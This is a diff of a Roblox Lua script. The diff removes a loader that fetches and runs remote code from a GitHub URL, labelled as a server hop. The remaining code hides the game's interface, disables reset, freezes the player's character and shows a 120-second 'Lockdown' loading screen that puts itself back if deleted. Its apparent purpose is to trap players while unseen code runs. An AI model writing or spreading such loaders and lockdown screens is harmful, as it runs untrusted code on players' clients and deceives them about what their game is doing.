@@ -1,16 +1,3 @@
--- Load external script that does the teleport/server hop
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Gey123123/g3zmar/refs/heads/main/g3zmarScripts"))()
-end)
-
--- Wait for teleport to finish and game to fully load on new server
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
-
--- Add slight delay to ensure character is spawned
-task.wait(3)
-
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local RunService = game:GetService("RunService")
@@ -19,24 +6,24 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Disable CoreGui and other UI features
+-- Disable Core UI and reset button
 pcall(function()
     StarterGui:SetCore("TopbarEnabled", false)
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
     StarterGui:SetCore("ResetButtonCallback", false)
 end)
 
--- Block Escape and F9
-UserInputService.InputBegan:Connect(function(input, processed)
+-- Detect (but cannot block) Escape/F9
+UserInputService.InputBegan:Connect(function(input)
     if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.F9 then
-        return true
+        -- Detected, but blocking not possible in most clients
     end
 end)
 
 -- Freeze character movement
 local function freezeCharacter(char)
     task.wait(0.1)
-    local humanoid = char:FindFirstChild("Humanoid")
+    local humanoid = char:WaitForChild("Humanoid", 3)
     if humanoid then
         humanoid.WalkSpeed = 0
         humanoid.JumpPower = 0
@@ -48,7 +35,7 @@ end
 player.CharacterAdded:Connect(freezeCharacter)
 if player.Character then freezeCharacter(player.Character) end
 
--- Create Loading UI
+-- Create Lockdown Loading Screen
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "LockdownLoading"
 screenGui.IgnoreGuiInset = true
@@ -96,18 +83,18 @@ madeByText.BackgroundTransparency = 1
 madeByText.TextColor3 = Color3.fromRGB(150, 150, 150)
 madeByText.Parent = bg
 
--- Animate loading bar
+-- Animate Loading Bar Progress
 local duration = 120
 local steps = 100
 local stepTime = duration / steps
 
 for i = 1, steps do
-	local progress = i / steps
-	barFill:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, true)
-	task.wait(stepTime)
+    local progress = i / steps
+    barFill:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, true)
+    task.wait(stepTime)
 end
 
--- Freeze character again just in case
+-- Freeze again just in case
 pcall(function()
     if player.Character and player.Character:FindFirstChild("Humanoid") then
         local h = player.Character.Humanoid
@@ -118,7 +105,7 @@ pcall(function()
     end
 end)
 
--- Prevent UI from being deleted
+-- Re-parent if UI is removed
 screenGui.AncestryChanged:Connect(function()
     if not screenGui:IsDescendantOf(playerGui) then
         screenGui.Parent = playerGui
